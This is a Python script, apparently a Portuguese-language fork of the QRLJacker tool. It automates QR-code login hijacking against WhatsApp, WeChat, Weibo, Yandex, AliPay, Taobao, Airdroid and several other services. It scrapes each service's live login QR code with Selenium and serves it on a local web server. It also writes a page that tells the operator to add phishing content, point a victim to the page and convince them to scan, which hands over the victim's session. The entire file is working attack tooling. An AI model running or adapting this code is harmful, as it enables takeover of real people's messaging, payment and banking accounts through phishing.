#!/usr/bin/env python
#-×- encoding:utf-8 -×-
#Author: RavokTHC
import base64 ,time ,os ,urllib ,sys ,threading
from binascii import a2b_base64

def clear():
	if os.name == "nt":
		os.system("cls")
	else:
		os.system("clear")

try:
	from PIL import Image
	import selenium, requests, configparser
	from selenium import webdriver

except:
	print "[×] Erro ao importar bibliotecas externas"
	print "[×] Tentando instalá-lo usando o arquivo requirements.txt..\n"
	try:
		os.system("pip install -r requirements.txt")
	except:
		try:
			os.system(str(sys.executable)+" -m pip install -r requirements.txt")
		except:
			print "[×] Falha ao instalar os requisitos [Instale você mesmo :p ]"
		exit()

finally:
	from PIL import Image
	import selenium
	from selenium import webdriver

settings = configparser.ConfigParser()

def Serve_it(port=1337):
	def serve(port):
		if os.name=="nt":
			try:
				print " [×] Iniciando a sessão da vítima em http://localhost:"+str(port)
				os.system("python -m SimpleHTTPServer "+str(port)+" > NUL 2>&1")
			except:
				print " [×] Iniciando a sessão da vítima em http://localhost:"+str(port)
				os.system(str(sys.executable)+" -m SimpleHTTPServer "+str(port)+" > NUL 2>&1")
		else:
			print " [×] Iniciando a sessão da vítima em http://localhost:"+str(port)
			os.system("python -m SimpleHTTPServer "+str(port)+" > /dev/null 2>&1")
	threading.Thread(target=serve,args=(port,)).start()

def create_driver():
	try:
		web = webdriver.Firefox()
		print " [×] Abrindo Mozila FireFox..."
		return web
	except:
		try:
			web = webdriver.Chrome()
			print " [×] Temos alguns erros ao executar o Firefox, Abrindo Google Chrome ..."
			return web
		except:
			try:
				web = webdriver.Opera()
				print " [×] Temos alguns erros ao executar o Chrome, Abrindo Opera ..."
				return web
			except:
				try:
					web = webdriver.Edge()
					print " [×] Temos alguns erros ao executar o Opera, Abrindo Edge ..."
					return web
				except:
					try:
						web = webdriver.Ie()
						print " [×] Temos alguns erros ao executar o Edge, Abrindo Internet Explorer ..."
						return web
					except:
						print " Erro: \n Não é possível chamar nenhum navegador da Web\n  Verifique seus navegadores instalados!"
						exit()


def Screenshot(PicName ,location ,size):
	img = Image.open(PicName)
	left = location['x']
	top = location['y']
	right = left + size['width']
	bottom = top + size['height']
	box = (int(left), int(top), int(right), int(bottom))
	final = img.crop(box)
	final.load()
	final.save(PicName)

def whatsapp():
	driver = create_driver()
	time.sleep(5)
	print " [×] Iniciando a sessão do atacante..."
	try:
		driver.get('https://web.whatsapp.com/')
		time.sleep(5)
	except:
		print " [!] Erro Verifique sua conexão com a internet"
		time.sleep(5)
		return

	while True:
		try:
			button = driver.find_element_by_class_name('qr-button')
			print " [×] Ocioso detectado, Recarregando imagem de código QR (Bom trabalho WhatsApp)..."
			button._execute(webdriver.remote.command.Command.CLICK_ELEMENT)
			time.sleep(5)
		except:
			pass

		try:
			img = driver.find_elements_by_tag_name('img')[0]
			src = img.get_attribute('src').replace("data:image/png;base64,","")
			print " [×] Imagem de código QR detectada !"
			print " [×] Baixando a imagem..."
			binary_data = a2b_base64(src)
			qr = open("tmp.png","wb")
			qr.write(binary_data)
			print " [×] Salvo como tmp.png"
			qr.close()
			time.sleep(5)
			continue
		except:
			break

#make("svg")
def Yandex():
	driver = create_driver()
	time.sleep(5)
	print " [×] Iniciando a sessão do atacante..."
	try:
		driver.get("https://passport.yandex.com/auth?mode=qr")
		time.sleep(5)
	except:
		print " [!] Erro Verifique sua conexão com a internet"
		time.sleep(5)
		return

	while True:
		try:
			img_url = "https://passport.yandex.com" + driver.find_element_by_class_name("qr-code__i").get_attribute("style").split("\"")[1].encode("utf-8")
			print " [×] Imagem de código QR detectada !"
			data = urllib.urlopen(img_url).read()
			print " [×] Baixando a imagem.."
			f = open("tmp.svg","w").write(data)
			print " [×] Salvo como tmp.svg"
			time.sleep(20)
			if "yandex.com" in driver.current_url.encode("utf-8"):
			    if "mode=qr" not in driver.current_url.encode("utf-8"):
					print " [×] Atualizando a pagina..."
					try:
						driver.get("https://passport.yandex.com/auth?mode=qr")
						time.sleep(5)
					except:
						print " [!] Erro Verifique sua conexão com a internet"
						time.sleep(5)
						return
			continue
		except:
			break

def Airdroid():
	driver = create_driver()
	time.sleep(5)
	print " [×] Iniciando a sessão do atacante..."
	try:
		driver.get("http://web.airdroid.com")
		time.sleep(5)
	except:
		print " [!] Erro Verifique sua conexão com a internet"
		time.sleep(5)
		return
	img_number = 16
	refresh = 0
	while True:

		try:
			button = driver.find_element_by_class_name("widget-login-refresh-qrcode")[0]
			print " [×] Clicar para recarregar a imagem do código QR..."
			button._execute(selenium.webdriver.remote.command.Command.CLICK_ELEMENT)
			time.sleep(5)
		except:
			pass
		try:
			imgs = driver.find_elements_by_tag_name('img')
			img = imgs[img_number]
			print " [×] Imagem de código QR detectada !"
			src = img.get_attribute('src')
			print " [×] Baixando a imagem.."
			qr = urllib.urlretrieve(src, "tmp.png")
			print " [×] Salvo como tmp.png"
			time.sleep(10)
			if refresh == 0:
				print " [×] Atualizando a pagina..."
				driver.refresh()
				refresh = 1
			img_number = 15
			continue
		except:
			break

def Weibo():
	driver = create_driver()
	time.sleep(5)
	print " [×] Iniciando a sessão do atacante..."
	try:
		driver.get("http://weibo.com/login.php")
		time.sleep(5)
	except:
		print " [!] Erro Verifique sua conexão com a internet"
		time.sleep(5)
		return
	while True:

		try:
			imgs = driver.find_elements_by_tag_name('img')
			img = imgs[len(imgs)-1]
			print " [×] Imagem de código QR detectada !"
			src = img.get_attribute('src')
			print " [×] Baixando a imagem.."
			qr = urllib.urlretrieve(src, "tmp.png")
			print " [×] Salvo como tmp.png"
			time.sleep(60)
			print " [×] Atualizando a pagina..."
			driver.refresh()
			continue
		except:
			break

def WeChat():
	driver = create_driver()
	time.sleep(5)
	print " [×] Iniciando a sessão do atacante..."
	try:
		driver.get("https://web.wechat.com")
		time.sleep(5)
	except:
		print " [×] Erro Verifique sua conexão com a internet"
		time.sleep(5)
		return
	while True:
		try:
			iclass = driver.find_element_by_class_name('qrcode')[0]
			img = iclass.find_elements_by_tag_name("img")[0]
			print " [×] Imagem de código QR detectada !"
			src = img.get_attribute('src')
			print " [×] Baixando a imagem.."
			qr = urllib.urlretrieve(src, "tmp.png")
			print " [×] Salvo como tmp.png"
			time.sleep(10)
			continue
		except:
			break

def AliPay():
	driver = create_driver()
	time.sleep(5)
	print " [×] Iniciando a sessão do atacante..."
	try:
		driver.get("https://auth.alipay.com/login/index.htm")
		time.sleep(5)
	except:
		print " [×] Erro Verifique sua conexão com a internet"
		time.sleep(5)
		return
	while True:

		try:
			c = driver.find_elements_by_class_name('ui-nav')[0]
			button = c.find_elements_by_tag_name("li")[0]
			print " [×] Clicar para recarregar a imagem do código QR..."
			button._execute(webdriver.remote.command.Command.CLICK_ELEMENT)
			time.sleep(5)
		except:
			pass

		try:
			driver.save_screenshot('tmp.png') 
			img = driver.find_elements_by_tag_name("canvas")[0]
			print " [×] Imagem de código QR detectada !"
			location = img.location
			size = img.size
			print " [×] Grabbing photo.."
			Screenshot("tmp.png" ,location ,size)
			print " [×] Salvo como tmp.png"
			time.sleep(60)
			print " [×] Atualizando a pagina..."
			driver.refresh()
			continue
		except:
			break

def Taobao():
	driver = create_driver()
	time.sleep(5)
	print " [×] Iniciando a sessão do atacante..."
	try:
		driver.get("https://login.taobao.com")
		time.sleep(5)
	except:
		print " [×] Erro Verifique sua conexão com a internet"
		time.sleep(5)
		return
	while True:

		try:
			button_class = driver.find_element_by_class_name("msg-err")
			button = button_class.find_elements_by_tag_name("a")[0]
			print " [×] Clicar para recarregar a imagem do código QR..."
			button._execute(webdriver.remote.command.Command.CLICK_ELEMENT)
			time.sleep(5)
		except:
			pass
		try:
			imgs = driver.find_elements_by_tag_name('img')
			img = imgs[0]
			print " [×] Imagem de código QR detectada !"
			src = img.get_attribute('src')
			print " [×] Baixando a imagem.."
			qr = urllib.urlretrieve(src, "tmp.png")
			print " [×] Salvo como tmp.png"
			time.sleep(10)
			continue
		except:
			break

def mydigipass():
	driver = create_driver()
	time.sleep(5)
	print " [×] Iniciando a sessão do atacante..."
	try:
		driver.get("https://www.mydigipass.com/en/fp/signin/smartphone/qr")
		time.sleep(5)
	except:
		print " [!] Erro Verifique sua conexão com a internet"
		time.sleep(5)
		return
	while True:

		try:
			imgs = driver.find_elements_by_tag_name('img')
			img = imgs[1]
			print " [×] Imagem de código QR detectada !"
			src = img.get_attribute('src')
			print " [×] Baixando a imagem.."
			qr = urllib.urlretrieve(src, "tmp.png")
			print " [×] Salvo como tmp.png"
			time.sleep(20)
			print " [×] Atualizando a pagina..."
			driver.refresh()
			continue
		except:
			break

def Zapper():
	driver = create_driver()
	time.sleep(5)
	print " [×] Iniciando a sessão do atacante..."
	try:
		driver.get("https://www.zapper.com/login.php")
		time.sleep(5)
	except:
		print " [!] Erro Verifique sua conexão com a internet"
		time.sleep(5)
		return
	while True:
		try:
			img = driver.find_elements_by_tag_name("img")[3]
			print " [×] Imagem de código QR detectada !"
			src = img.get_attribute('src')
			print " [×] Baixando a imagem.."
			qr = urllib.urlretrieve(src, "tmp.png")
			print " [×] Salvo como tmp.png"
			time.sleep(20)
		except:
			break

def Trustly_App():
	driver = create_driver()
	time.sleep(5)
	print " [×] Iniciando a sessão do atacante..."
	try:
		driver.get("https://trustlyapp.com/backend")
		time.sleep(5)
	except:
		print " [!] Erro Verifique sua conexão com a internet"
		time.sleep(5)
		return
	while True:

		try:
			c = driver.find_elements_by_class_name("qrcode-tab")[0]
			img = c.find_elements_by_tag_name("img")[0]
			print " [×] Imagem de código QR detectada !"
			src = img.get_attribute('src')
			print " [×] Baixando a imagem.."
			qr = urllib.urlretrieve(src, "tmp.png")
			print " [×] Salvo como tmp.png"
			time.sleep(60)
			continue
		except:
			break

def Yelophone():
	driver = create_driver()
	time.sleep(5)
	print " [×] Iniciando a sessão do atacante..."
	try:
		driver.get("https://www.yelophone.com/app#/login")
		time.sleep(5)
	except:
		print " [!] Erro Verifique sua conexão com a internet"
		time.sleep(5)
		return
	while True:

		try:
			c = driver.find_elements_by_id("qrcode")[0]
			print " [×] Imagem de código QR detectada !"
			src = c.get_attribute("src")
			print " [×] Baixando a imagem.."
			qr = open("tmp.png","wb").write( requests.get( c.get_attribute("src") ).content )
			print " [×] Salvo como tmp.png"
			time.sleep(60)
			continue
		except:
			break

def make( service_name , port , type="html" ):
	if type == "html":
		code = """<html>
<head>
<title>"""+str(service_name)+"""</title>
</head>
<body>
<script>
var myTimer; myTimer = window.setInterval(reloadD,3000);
function reloadD(){ d = new Date(); document.getElementById('qrcodew').src="tmp.png?h="+d.getTime();}
</script>
<center><h1><b>QRLJacker: """+str(service_name)+"""</b></h1>
Now you have a local webserver hosting your QRLJacking payload, Here's some instructions to be done:
</br>1. This is your always updated """+str(service_name)+""" QR Code
</b><img id="qrcodew" alt="Scan me!" src="tmp.png" style="display: block;">
</br>2. Edit Index.html by adding your phishing page source code, style, resources, etc.. ("Index.html" located in the framework folder)
</br>3. Point your victim to your phishing <a href='http://localhost:"""+str(port)+"""'>URL</a>, Convince to scan the QR code and Bob is your uncle!
</center>
</body>
</html>"""

	if type == "svg":
		code = """<html>
<head>
<title>"""+str(service_name)+"""</title>
</head>
<body>
<script>
var myTimer; myTimer = window.setInterval(reloadD,3000);
function reloadD(){ d = new Date(); document.getElementById('qrcodew').src="tmp.svg?h="+d.getTime();}
</script>
<center><h1><b>QRLJacker: """+str(service_name)+"""</b></h1>
Now you have a local webserver hosting your QRLJacking payload, Here's some instructions to be done:
</br>1. This is your always updated """+str(service_name)+""" QR Code
</b><img id="qrcodew" alt="Scan me!" src="tmp.svg" style="display: block;">
</br>2. Edit Index.html by adding your phishing page source code, style, resources, etc.. ("Index.html" located in the framework folder)
</br>3. Point your victim to your phishing <a href='http://localhost:"""+str(port)+"""'>URL</a>, Convince to scan the QR code and Bob is your uncle!
</center>
</body>
</html>"""
	f = open("index.html","w")
	f.write(code)
	f.close()

def Add_website():
	print "  1.Localizar imagem por classe e seu método numérico"
	print "  2.Localizar imagem pelo seu método de número único"
	print "  3.Localizar imagem pelo método de captura de tela"
	print "  00.Voltar ao menu principal"
	method = raw_input("\n  Nota: A personalização não suporta imagens svg por enquanto\n  Selecione o método > ")
	if method == "00":
		main()

	elif int(method) == 1:
		classname = raw_input("   Classname > ")
		url = raw_input("   Url > ")
		image_number = int( raw_input("   Image Number > ") )
		Seconds = raw_input("   Refresh every (Default 10s) > ")
		try:
			int(Seconds)
		except:
			Seconds = 10
		port = raw_input("   Port to listen on (Default 1337) : ")
		try:
			int(port)
		except ValueError:
			port = 1337
		print " [×] Saving settings..."
		settings.read(os.path.join('Data', 'Custom.ini'))
		name = url.replace("http://","").replace("https://","").split("/")[0]
		settings.add_section(name)
		settings.set(name,"method","1")
		settings.set(name,"classname",classname)
		settings.set(name,"url",url)
		settings.set(name,"image_number",str(image_number))
		settings.set(name,"Seconds",str(Seconds))
		settings.write(open(os.path.join('Data', 'Custom.ini'),"wb"))
		clear()
		print " [×] Settings saved."
		print " [×] Running the exploit..."
		print "="×12
		make( name , port )
		Serve_it(port)
		First_Method(classname,url,image_number,Seconds)
		main()

	elif int(method) == 2:
		url = raw_input("   Url > ")
		image_number = int( raw_input("   Image Number > ") )
		Seconds = raw_input("   Refresh every (Default 10s) > ")
		try:
			int(Seconds)
		except:
			Seconds = 10
		port = raw_input("   Port to listen on (Default 1337) : ")
		try:
			int( port )
		except ValueError:
			port = 1337
		print " [×] Saving settings..."
		settings.read(os.path.join('Data', 'Custom.ini'))
		name = url.replace("http://","").replace("https://","").split("/")[0]
		settings.add_section(name)
		settings.set(name,"method","2")
		settings.set(name,"url",url)
		settings.set(name,"image_number",str(image_number))
		settings.set(name,"Seconds",str(Seconds))
		settings.write(open(os.path.join('Data', 'Custom.ini'),"wb"))
		clear()
		print " [×] Settings saved."
		print " [×] Running the exploit..."
		print "="×12
		make( name , port )
		Serve_it( port )
		Second_Method( url , image_number , Seconds )
		main()

	elif int(method) == 3:
		url = raw_input("   Url > ")
		image_number = int( raw_input("   Image Number (To get its width and location)> ") )
		Seconds = raw_input("   Refresh every (Default 10s) > ")
		try:
			int(Seconds)
		except:
			Seconds = 10
		port = raw_input("   Port to listen on (Default 1337) : ")
		try:
			int( port )
		except ValueError:
			port = 1337
		print " [×] Saving settings..."
		settings.read(os.path.join('Data', 'Custom.ini'))
		name = url.replace("http://","").replace("https://","").split("/")[0]
		settings.add_section(name)
		settings.set(name,"method","3")
		settings.set(name,"url",url)
		settings.set(name,"image_number",str(image_number))
		settings.set(name,"Seconds",str(Seconds))
		settings.write(open(os.path.join('Data', 'Custom.ini'),"wb"))
		clear()
		print " [×] Settings saved."
		print " [×] Running the exploit..."
		print "="×12
		make( name , port )
		Serve_it( port )
		Third_Method( url , image_number , Seconds )
		main()

	else:
		main()

def Use_website():
	settings.read(os.path.join('Data', 'Custom.ini'))
	print "\n"
	for n,w in enumerate(settings.sections()):
		print " "+str(n)+"."+w.encode("utf-8")
	print " 00.Back To Main Menu"
	website = raw_input("\n  Select website > ")
	websites = settings.sections()
	if website == "00":
		main()
	try:
		section = websites[int(website)]
	except:
		Use_website()

	method = int( settings.get(section,"method") )

	if int(method) == 1:
		classname = settings.get(section,"classname")
		url = settings.get(section,"url")
		image_number = settings.get(section,"image_number")
		Seconds = settings.get(section,"Seconds")
		First_Method(classname,url,image_number,Seconds)
		main()

	elif int(method) == 2:
		url = settings.get(section,"url")
		image_number = settings.get(section,"image_number")
		Seconds = settings.get(section,"Seconds")
		Second_Method(url,image_number,Seconds)
		main()

	elif int(method) == 3:
		url = settings.get(section,"url")
		image_number = settings.get(section,"image_number")
		Seconds = settings.get(section,"Seconds")
		Third_Method(url,image_number,Seconds)
		main()

	else:
		Use_website()

def Remove_website():
	settings.read(os.path.join('Data', 'Custom.ini'))
	print "\n"
	for n,w in enumerate(settings.sections()):
		print " "+str(n)+"."+w.encode("utf-8")
	print " 00.Back To Main Menu"
	website = raw_input("\n  Select website > ")
	websites = settings.sections()
	if website == "00":
		main()
	try:
		section = websites[int(website)]
	except:
		Remove_website()
	settings.remove_section(section)
	print " [×] Website removed."
	time.sleep(5)
	main()

def First_Method(classname,url,image_number,s=10):
	driver = create_driver()
	time.sleep(5)
	print " [×] Iniciando a sessão do atacante..."
	try:
		driver.get(url)
		time.sleep(5)
	except:
		print " [!] Erro Verifique sua conexão com a internet"
		time.sleep(5)
		return

	while True:

		try:
			login = driver.find_element_by_class_name(classname)
			img = login.find_elements_by_tag_name('img')[int(image_number)]
			print " [×] Imagem de código QR detectada !"
			src = img.get_attribute('src')
			print " [×] Baixando a imagem.."
			qr = urllib.urlretrieve(src, "tmp.png")
			print " [×] Salvo como tmp.png"
			time.sleep(s)
			print " [×] Atualizando a pagina..."
			driver.refresh()
			continue
		except:
			break

def Second_Method(url,image_number,s=10):
	driver = create_driver()
	time.sleep(5)
	print " [×] Iniciando a sessão do atacante..."
	try:
		driver.get(url)
		time.sleep(5)
	except:
		print " [!] Erro Verifique sua conexão com a internet"
		time.sleep(5)
		return
	while True:

		try:
			imgs = driver.find_elements_by_tag_name('img')
			img = imgs[int(image_number)]
			print " [×] Imagem de código QR detectada !"
			src = img.get_attribute('src')
			print " [×] Baixando a imagem.."
			qr = urllib.urlretrieve(src, "tmp.png")
			print " [×] Salvo como tmp.png"
			time.sleep(s)
			print " [×] Atualizando a pagina..."
			driver.refresh()
			continue
		except:
			break

def Third_Method(url,image_number,s=10):
	driver = create_driver()
	time.sleep(5)
	print " [×] Iniciando a sessão do atacante..."
	try:
		driver.get(url)
		time.sleep(10)
	except:
		print " [!] Erro Verifique sua conexão com a internet"
		time.sleep(5)
		return
	while True:

		try:
			driver.save_screenshot('tmp.png') #screenshot entire page
			img = driver.find_elements_by_tag_name("img")[int(image_number)]
			print " [×] Imagem de código QR detectada !"
			location = img.location
			size = img.size
			print " [×] Grabbing photo.."
			Screenshot("tmp.png" ,location ,size)
			print " [×] Salvo como tmp.png"
			time.sleep(s)
			print " [×] Atualizando a pagina..."
			driver.refresh()
			continue
		except:
			break

def main():
	clear()
	print """



           )        
  *   ) ( /(   (    
` )  /( )\())  )\   
 ( )(_)|(_)\ (((_)      ___  ____   ____          _      
(_(_()) _((_))\___     / _ \|  _ \ / ___|___   __| | ___ 
|_   _|| || ((/ __|   | | | | |_) | |   / _ \ / _` |/ _ \
  | |  | __ || (__    | |_| |  _ <| |__| (_) | (_| |  __/
  |_|  |_||_| \___|    \__\_\_| \_\\____\___/ \__,_|\___|
                    	

  #THC QRCode é um framework personalizável para demonstrar "QRCode Attack Vectors" e mostra como é fácil sequestrar serviços que dependem da Autenticação de Código QR!
  #Um vetor de Ataque de Engenharia Social, desenvolvido por @RavokTHC, @Sahali, @GraoMestre
  #Coded by: RavokTHC

 Aplicativos e Serviços da Web Vulneráveis:
  1.Aplicativos de bate-papo
  2.Serviços de correspondência
  3.Comércio Eletrônicoe (ECommerce)
  4.Online Banking
  5.Serviços de Passaporte
  6.Mobile Management Software
  7.Outros serviços
  8.Costumização
  9.Sair
"""
	choice = raw_input(" Choice > ")
	if not choice.isdigit():
		main()
	else:
		choice = int(choice)
	#Chat Applications

	if choice == 9:
		exit()

	if choice == 1:
		print """
 1.WhatsApp
 2.WeChat
 3.Weibo
 00.Voltar ao Menu
	"""

		choice_2 = raw_input("\n Second Choice > ")

		if choice_2 == "00":
			main()

		#Whatsapp
		elif int(choice_2) == 1:
			port = raw_input(" Port to listen on (Default 1337) : ")
			try:
				int(port)
			except ValueError:
				port = 1337

			if port == "":
				port = 1337
			clear()
			make( "Whatsapp" , port )
			Serve_it(port)
			whatsapp()
			main()

		#Wechat
		elif int(choice_2) == 2:
			port = raw_input(" Port to listen on (Default 1337) : ")
			try:
				int(port)
			except ValueError:
				port = 1337

			if port == "":
				port = 1337
			clear()
			make( "WeChat" , port )
			Serve_it(port)
			WeChat()
			main()

		#Weibo
		elif int(choice_2) == 3:
			port = raw_input(" Port to listen on (Default 1337) : ")
			if port == "":port = 1337
			clear()
			make( "Weibo" , port )
			Serve_it(port)
			Weibo()
			main()

		else:
			main()

	#Mailing Services
	if choice == 2:
		print """
 1.Yandex Mail
 00.Voltar ao Menu
	"""
		choice_2 = raw_input("\n Second Choice > ")

		if choice_2 == "00":
			main()

		#Yandex Mail
		elif int(choice_2) == 1:
			port = raw_input(" Port to listen on (Default 1337) : ")
			try:
				int(port)
			except ValueError:
				port = 1337

			if port == "":
				port = 1337
			clear()
			make( "Yandex" , port , "svg")
			Serve_it(port)
			Yandex()
			main()

		else:
			main()

	#eCommerce
	if choice == 3:
		print """
 1.Taobao
 2.Taobao Trips
 00.Voltar ao Menu
	"""
		choice_2 = raw_input("\n Second Choice > ")
		if choice_2 == "00":
			main()

		#Taobao
		elif int(choice_2) == 1:
			port = raw_input(" Port to listen on (Default 1337) : ")
			try:
				int(port)
			except ValueError:
				port = 1337

			if port == "":
				port = 1337
			clear()
			make( "Taobao" , port )
			Serve_it(port)
			Taobao()
			main()

		#Taobao Trips
		elif int(choice_2) == 2:
			port = raw_input(" Port to listen on (Default 1337) : ")
			try:
				int(port)
			except ValueError:
				port = 1337

			if port == "":
				port = 1337
			clear()
			make( "Taobao Trips" , port )
			Serve_it(port)
			Taobao()
			main()

		else:
			main()

	#Online Banking
	if choice == 4:
		print """
 1.AliPay
 2.Yandex Money
 00.Voltar ao Menu
	"""
		choice_2 = raw_input("\n Second Choice > ")
		if choice_2 == "00":
			main()

		#AliPay
		elif int(choice_2) == 1:
			port = raw_input(" Port to listen on (Default 1337) : ")
			try:
				int(port)
			except ValueError:
				port = 1337

			if port == "":
				port = 1337
			clear()
			make( "AliPay" , port )
			Serve_it(port)
			AliPay()
			main()

		#Yandex Money
		elif int(choice_2) == 2:
			port = raw_input(" Port to listen on (Default 1337) : ")
			try:
				int(port)
			except ValueError:
				port = 1337

			if port == "":
				port = 1337
			clear()
			make( "Yandex Money" , port , "svg")
			Serve_it(port)
			Yandex()
			main()

		else:
			main()

	#Passport Services
	if choice == 5:
		print """
 1.Yandex Passport
 00.Voltar ao Menu
	"""
		choice_2 = raw_input("\n Second Choice > ")
		if choice_2 == "00":
			main()

		#Yandex Passport
		elif int(choice_2) == 1:
			port = raw_input(" Port to listen on (Default 1337) : ")
			try:
				int(port)
			except ValueError:
				port = 1337

			if port == "":
				port = 1337
			clear()
			make( "Yandex passport" , port , "svg")
			Serve_it(port)
			Yandex()
			main()

		else:
			main()

	#Mobile Management Software
	if choice == 6:
		print """
 1.Airdroid
 00.Voltar ao Menu
	"""
		choice_2 = raw_input("\n Second Choice > ")

		if choice_2 == "00":
			main()

		#Airdroid
		elif int(choice_2) == 1:
			port = raw_input(" Port to listen on (Default 1337) : ")
			try:
				int(port)
			except ValueError:
				port = 1337

			if port == "":
				port = 1337
			clear()
			make( "Airdroid" , port )
			Serve_it(port)
			Airdroid()
			main()

		else:
			main()

	#Other Services
	if choice == 7:
		print """
 1.MyDigiPass
 2.Zapper
 3.Trustly App
 4.Yelophone
 00.Voltar ao Menu
"""
		choice_2 = raw_input("\n Second Choice > ")
		if choice_2 == "00":
			main()

		#MyDigiPass
		elif int(choice_2) == 1:
			port = raw_input(" Port to listen on (Default 1337) : ")
			try:
				int(port)
			except ValueError:
				port = 1337

			if port == "":
				port = 1337
			clear()
			make( "MyDigiPass" , port )
			Serve_it(port)
			mydigipass()
			main()

		#Zapper
		elif int(choice_2) == 2:
			port = raw_input(" Port to listen on (Default 1337) : ")
			try:
				int(port)
			except ValueError:
				port = 1337

			if port == "":
				port = 1337
			clear()
			make( "Zapper" , port )
			Serve_it(port)
			Zapper()
			main()

		#Trustly App
		elif int(choice_2) == 3:
			port = raw_input(" Port to listen on (Default 1337) : ")
			try:
				int(port)
			except ValueError:
				port = 1337

			if port == "":
				port = 1337
			clear()
			make( "Trustly app" , port )
			Serve_it(port)
			Trustly_App()
			main()

		#Yelophone
		elif int(choice_2) == 4:
			port = raw_input(" Port to listen on (Default 1337) : ")
			try:
				int(port)
			except ValueError:
				port = 1337

			if port == "":
				port = 1337
			clear()
			make( "Yelophone" , port )
			Serve_it(port)
			Yelophone()
			main()

		else:
			main()

	#Customization
	if choice == 8:
		print " 1.Adicione um novo site."
		print " 2.Use um site existente."
		print " 3.Remover um site existente."
		print " 00.Voltar ao Menu"

		choice_2 = raw_input("\n Second Choice > ")
		if choice_2 == "00":
			main()

		elif int(choice_2) == 1:
			Add_website()

		elif int(choice_2) == 2:
			Use_website()

		elif int(choice_2) == 3:
			Remove_website()

		else:
			main()

		#settings.read(os.path.join('Data', 'Custom.ini'))
		#sections = settings.sections()
		#url = settings.get(section,"url")
		#settings.add_section(name)
		#settings.set(name,"url",url)
		#settings.write(open(os.path.join('Data', 'Custom.ini'),"wb"))

	else:
		main()

if __name__ == '__main__':
	main()
